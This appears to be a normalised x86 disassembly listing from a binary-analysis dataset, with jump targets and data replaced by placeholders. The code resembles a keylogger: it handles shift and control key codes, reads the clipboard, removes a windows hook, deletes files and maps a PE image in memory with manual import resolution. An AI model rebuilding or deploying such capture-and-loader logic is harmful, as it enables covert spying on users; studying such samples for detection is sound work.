push r--data
jmp r-xdata
sub eax 0x4
je r-xdata
sub ecx 0xdb
je r-xdata
je r-xdata
push ebx
lea eax [ ebp - 0x11 ]
sub esp 0x10
mov ecx esp
lea eax [ ecx - 0x30 ]
cmp eax 0x9
ja r-xdata
sub ecx 0xdb
je r-xdata
je r-xdata
push ebx
lea eax [ ebp - 0x11 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
lea eax [ ecx - 0x30 ]
cmp eax 0x9
ja r-xdata
sub eax 0x67
je r-xdata
je r-xdata
push ebx
lea eax [ ebp - 0x1b ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x1a ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x19 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x17 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x16 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x15 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x14 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x13 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x12 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x11 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x1b ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x1a ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x19 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x17 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x16 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x15 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x14 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x13 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x12 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x11 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x17 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
jne r-xdata
push ebx
lea eax [ ebp - 0x11 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0xa ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x4 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub eax 0x6
je r-xdata
push ebx
lea eax [ ebp - 0x7 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
dec ecx
je r-xdata
push ebx
lea eax [ ebp - 0xb ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub ecx 0xbb
je r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_40441a
jmp [ eax * 4 + jump_table_405825 ]
push ebx
lea eax [ ebp - 0x7 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
dec ecx
je r-xdata
push ebx
lea eax [ ebp - 0xb ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub ecx 0xbb
je r-xdata
jmp [ eax * 4 + jump_table_4057fd ]
push ebx
lea eax [ ebp - 0xe ]
sub esp 0x10
mov ecx esp
push eax
push r--data
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x14 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub eax 0x2e
je r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
cmp [ esi + 0x2d ] 0x0
mov edi r--data
jne r-xdata
push ebx
lea eax [ ebp - 0x16 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
jne r-xdata
push ebx
lea eax [ ebp - 0x9 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
jne r-xdata
push ebx
lea eax [ ebp - 0x3 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x8 ]
sub esp 0x10
mov ecx esp
dec ecx
je r-xdata
push ebx
lea eax [ ebp - 0xc ]
sub esp 0x10
mov ecx esp
dec ecx
je r-xdata
push ebx
lea eax [ ebp - 0x1b ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x1a ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x19 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x17 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x16 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x15 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x14 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x13 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x12 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x8 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
dec ecx
je r-xdata
push ebx
lea eax [ ebp - 0xc ]
sub esp 0x10
mov ecx esp
jmp r-xdata
dec ecx
je r-xdata
push ebx
lea eax [ ebp - 0x1b ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x1a ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x19 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x17 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x16 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x15 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x14 ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0x13 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0x12 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
push ebx
lea eax [ ebp - 0xf ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_40441a
push ebx
lea eax [ ebp - 0x15 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub eax 0x32
je r-xdata
push ebx
lea eax [ ebp - 0xf ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x8 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
mov [ esi + 0x2f ] bl
jmp r-xdata
sub eax 0x7
je r-xdata
push ebx
lea eax [ ebp - 0x9 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec ecx
jne r-xdata
push ebx
lea eax [ ebp - 0xd ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec ecx
je r-xdata
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x9 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
dec ecx
jne r-xdata
push eax
push edi
jmp r-xdata
push ebx
lea eax [ ebp - 0xd ]
sub esp 0x10
mov ecx esp
dec ecx
je r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x16 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x2 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub eax 0x6
jne r-xdata
push ebx
lea eax [ ebp - 0xa ]
sub esp 0x10
mov ecx esp
push ebx
lea eax [ ebp - 0xe ]
sub esp 0x10
mov ecx esp
dec ecx
je r-xdata
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0xa ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0xe ]
sub esp 0x10
mov ecx esp
jmp r-xdata
dec ecx
je r-xdata
push ebx
lea eax [ ebp - 0x11 ]
sub esp 0x10
mov ecx esp
push eax
push edi
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x17 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0xf ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec ecx
jne r-xdata
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0xf ]
sub esp 0x10
mov ecx esp
jmp r-xdata
dec ecx
jne r-xdata
push ebx
lea eax [ ebp - 0x12 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
dec eax
jne r-xdata
push ebx
lea eax [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x10 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push ebx
lea eax [ ebp - 0x13 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x19 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x1a ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1b ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub_40584d
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x2e ] 0x1
jne r-xdata
xor ebx ebx
cmp [ esi + 0x2c ] bl
mov [ ebp - 0x1 ] bl
jne r-xdata
cmp [ esi + 0x40 ] 0x56
push 0x0
je r-xdata
cmp [ esi + 0x2d ] bl
jne r-xdata
cmp [ esi + 0x2d ] bl
jne r-xdata
sub esp 0x10
lea eax [ ebp - 0x54 ]
mov edi esp
mov ecx esi
push r--data
push eax
call sub_405aea
push eax
lea eax [ ebp - 0x44 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx esi
call sub_40441a
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x54 ]
jmp r-xdata
lea eax [ ebp - 0x2 ]
lea ecx [ ebp - 0x34 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
mov edi esp
push eax
push [ esi + 0x40 ]
call [ toupper@IAT ]
pop ecx
push eax
lea eax [ ebp - 0x3 ]
push eax
push r--data
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@D@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx esi
call sub_40441a
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
mov eax [ esi + 0x40 ]
cmp eax 0xa0
je r-xdata
push [ esi + 0x40 ]
call [ toupper@IAT ]
pop ecx
mov [ ebp - 0x1 ] al
push ebx
lea eax [ ebp - 0x3 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
mov eax [ esi + 0x40 ]
cmp eax 0xa0
je r-xdata
push [ esi + 0x40 ]
call [ tolower@IAT ]
pop ecx
mov [ ebp - 0x1 ] al
push ebx
lea eax [ ebp - 0x3 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0xa1
je r-xdata
push eax
lea eax [ ebp - 0x1 ]
push 0x1
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_40441a
cmp eax 0xa1
je r-xdata
push eax
call [ tolower@IAT ]
pop ecx
mov [ ebp - 0x1 ] al
push ebx
lea eax [ ebp - 0x3 ]
sub esp 0x10
mov ecx esp
push eax
call [ toupper@IAT ]
pop ecx
mov [ ebp - 0x1 ] al
push ebx
lea eax [ ebp - 0x3 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
sub_4059cc
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
cmp [ esi + 0x38 ] 0x10
jne r-xdata
pop esi
leave
retn
mov eax [ esi + 0x40 ]
sub eax 0x45
je r-xdata
push 0x1
lea eax [ ebp - 0x5 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
sub eax 0x75
je r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_40441a
push 0x1
lea eax [ ebp - 0x3 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub eax 0x5
je r-xdata
push 0x1
lea eax [ ebp - 0x2 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub eax 0x1e
jne r-xdata
push 0x1
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub_405a5c
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x40 ]
sub eax 0xa2
je r-xdata
push 0x1
lea eax [ ebp - 0x2 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
dec eax
jne r-xdata
pop esi
leave
retn
push 0x1
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_40441a
sub_405aea
push ebp
mov ebp esp
push ecx
push esi
push 0x0
call [ OpenClipboard@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x1 ]
push eax
push r--data
push 0x1
call [ GetClipboardData@IAT ]
mov esi eax
call [ CloseClipboard@IAT ]
test esi esi
je r-xdata
lea eax [ ebp - 0x1 ]
push eax
push esi
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop esi
leave
retn 0x4
sub_405b30
push ebp
mov ebp esp
sub esp 0x24
test [ rw-data ] 0x1
push ebx
push esi
push edi
mov ebx ecx
mov edi rw-data
jne r-xdata
lea eax [ ebp - 0x14 ]
mov ecx ebx
push eax
call sub_405aea
mov esi rw-data
lea eax [ ebp - 0x14 ]
push esi
push eax
call [ std::operator==@IAT ]
pop ecx
test al al
pop ecx
jne r-xdata
or [ rw-data ] 0x1
lea eax [ ebp - 0x1 ]
push eax
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_405bef
call sub_41241a
pop ecx
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x14 ]
mov ecx edi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea eax [ ebp - 0x14 ]
push r--data
push eax
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
push 0x0
lea eax [ ebp - 0x24 ]
sub esp 0x10
mov edi esp
push r--data
push esi
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx ebx
call sub_40441a
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_405bfa
push ebx
push esi
mov esi ecx
lea ecx [ esi + 0x54 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ DeleteFileW@IAT ]
test eax eax
setne bl
add esi 0x64
push r--data
push esi
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
mov al bl
pop esi
pop ebx
retn
mov ecx esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ RemoveDirectoryW@IAT ]
sub_405c3c
push esi
push edi
mov edi [ TerminateThread@IAT ]
mov esi ecx
push 0x0
push sub_4041bb
and [ esi + 0x3c ] 0x0
call edi
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx esi
call sub_405bfa
pop edi
pop esi
retn
push eax
call [ UnhookWindowsHookEx@IAT ]
and [ esi ] 0x0
push 0x0
push sub_40419b
call edi
sub_405c76
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
je r-xdata
xor eax eax
mov edi [ rw-data ]
test edi edi
je r-xdata
push esi
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test edi edi
pop esi
je r-xdata
mov edi [ edi + 0x10c ]
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov eax [ edi ]
jmp r-xdata
mov esi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
test eax eax
je r-xdata
inc eax
inc eax
inc esi
inc esi
test cl cl
jne r-xdata
pop edi
pop ebp
retn
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_405cd4
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov eax [ esi + 0x3c ]
push edi
lea eax [ eax + esi + 0x18 ]
mov eax [ eax + 0x38 ]
add eax 0x1000
push eax
push edi
push 0x4
push edi
push 0xffffffff
call [ CreateFileMappingA@IAT ]
push edi
push edi
push edi
mov ebx eax
push edi
push 0x2
push ebx
call [ MapViewOfFileEx@IAT ]
push ebx
mov edi eax
call [ CloseHandle@IAT ]
push edi
push esi
call sub_405e8f
push edi
call sub_405d33
push 0x1
push edi
call sub_405f09
add esp 0x14
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
sub_405d33
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov ecx [ eax + 0x3c ]
cmp [ ecx + eax + 0x74 ] 0x10
lea ebx [ ecx + eax + 0x18 ]
mov [ ebp - 0x8 ] ebx
jb r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edi eax
sub edi [ ebx + 0x1c ]
je r-xdata
mov esi [ ebx + 0x68 ]
add esi eax
cmp [ esi ] 0x0
je r-xdata
push 0x1
pop eax
cmp [ ebx + 0x8c ] 0x0
je r-xdata
mov edi [ esi + 0xc ]
add edi eax
push edi
call sub_405c76
test eax eax
pop ecx
mov [ ebp - 0x4 ] eax
jne r-xdata
mov ecx [ ebx + 0x88 ]
add ecx eax
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push edi
call [ LoadLibraryA@IAT ]
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ebx [ ecx + 0x4 ]
and [ ebp - 0x4 ] 0x0
sub ebx 0x8
lea esi [ ecx + 0x8 ]
shr ebx 0x1
test ebx ebx
jle r-xdata
mov eax [ ebp + 0x8 ]
add esi 0x14
cmp [ esi ] 0x0
jne r-xdata
mov edi [ esi ]
mov eax [ ebp - 0x4 ]
mov ebx [ esi + 0x10 ]
add edi [ ebp + 0x8 ]
add ebx [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] 0x123abc00
add ecx [ ecx + 0x4 ]
jmp r-xdata
movzx edx [ esi ]
mov eax edx
and eax 0xfff
add eax [ ecx ]
shr edx 0xc
add eax [ ebp + 0x8 ]
sub edx 0x0
je r-xdata
mov ebx [ ebp - 0x8 ]
test eax 0x80000000
je r-xdata
cmp [ ecx ] 0x0
je r-xdata
inc esi
inc esi
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] ebx
jl r-xdata
dec edx
je r-xdata
mov ecx [ ebp + 0x8 ]
add eax ecx
add eax 0x2
movzx eax ax
jmp r-xdata
mov edx edi
shr edx 0x10
add [ eax ] dx
dec edx
je r-xdata
mov [ ebx ] eax
add edi 0x4
add ebx 0x4
jmp r-xdata
push eax
push [ ebp - 0x4 ]
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
add [ eax ] di
jmp r-xdata
dec edx
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
add [ eax ] edi
jmp r-xdata
dec edx
jne r-xdata
movzx edx [ esi + 0x2 ]
add esi 0x2
lea edx [ edx + edi + 0x8000 ]
shr edx 0x10
or [ eax ] dx
jmp r-xdata
sub_405e8f
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov ecx [ eax + 0x3c ]
mov edi [ ebp + 0xc ]
mov esi eax
and [ ebp + 0x8 ] 0x0
lea edx [ eax + ecx ]
mov ecx [ eax + ecx + 0x54 ]
mov ebx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ eax + 0x3c ]
cmp [ edx + 0x6 ] 0x0
lea ecx [ eax + ecx + 0xf8 ]
jbe r-xdata
push 0x1
pop eax
pop edi
pop esi
pop ebx
leave
retn
lea edi [ ecx + 0x14 ]
mov [ ebp - 0x4 ] edi
mov ecx [ edi - 0x4 ]
mov esi eax
add esi [ edi ]
mov edi [ edi - 0x8 ]
add edi [ ebp + 0xc ]
mov ebx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp - 0x4 ]
movzx ecx [ edx + 0x6 ]
add edi 0x28
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] edi
jl r-xdata
sub_405f09
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x3c ]
add eax ecx
test [ eax + 0x17 ] 0x20
jne r-xdata
mov eax [ eax + 0x28 ]
push 0x0
push [ ebp + 0xc ]
add eax ecx
push ecx
call eax
pop ebp
retn
push 0x1
pop eax
pop ebp
retn
sub_405f2e
push ebp
mov ebp esp
sub esp 0xc
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
xor eax eax
leave
retn
mov eax [ edx + 0x3c ]
cmp [ eax + edx + 0x74 ] 0x10
lea eax [ eax + edx + 0x18 ]
jb r-xdata
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x60 ]
shr ecx 0x10
add eax edx
test cx cx
jne r-xdata
mov ecx [ eax + 0x24 ]
and [ ebp - 0xc ] 0x0
push ebx
push esi
push edi
mov edi [ eax + 0x20 ]
add edi edx
add ecx edx
cmp [ eax + 0x18 ] 0x0
jbe r-xdata
movzx ecx [ ebp + 0xc ]
sub ecx [ eax + 0x10 ]
mov ecx [ ebp + 0x8 ]
jmp r-xdata
mov eax [ eax + 0x1c ]
lea eax [ eax + ecx * 4 ]
mov eax [ eax + edx ]
add eax edx
leave
retn
mov esi [ ebp + 0xc ]
mov [ ebp - 0x8 ] esi
mov esi [ edi ]
add esi edx
sbb edx edx
sbb edx 0xffffffff
test dl dl
je r-xdata
movzx ecx [ ecx ]
add edi 0x4
inc ecx
inc ecx
inc [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
cmp edx [ eax + 0x18 ]
jb r-xdata
xor edx edx
jmp r-xdata
mov dl [ esi + 0x1 ]
mov [ ebp - 0x1 ] dl
cmp dl [ ebx + 0x1 ]
jne r-xdata
mov esi [ ebp - 0xc ]
pop edi
cmp esi [ eax + 0x18 ]
pop esi
pop ebx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test edx edx
je r-xdata
add [ ebp - 0x8 ] 0x2
inc esi
inc esi
test dl dl
jne r-xdata
mov edx [ ebp + 0x8 ]
jmp r-xdata
mov dl [ esi ]
mov ebx [ ebp - 0x8 ]
mov [ ebp - 0x1 ] dl
cmp dl [ ebx ]
jne r-xdata
sub_40600a
push ebp
mov ebp esp
sub esp 0x24
push ebx
lea eax [ ebp - 0x1 ]
push r--data
push eax
push r--data
call [ getenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ DeleteFileA@IAT ]
test eax eax
jne r-xdata
push 0x0
lea eax [ ebp - 0x2 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_40441a
mov bl 0x1
call [ GetLastError@IAT ]
dec eax
dec eax
je r-xdata
push 0x0
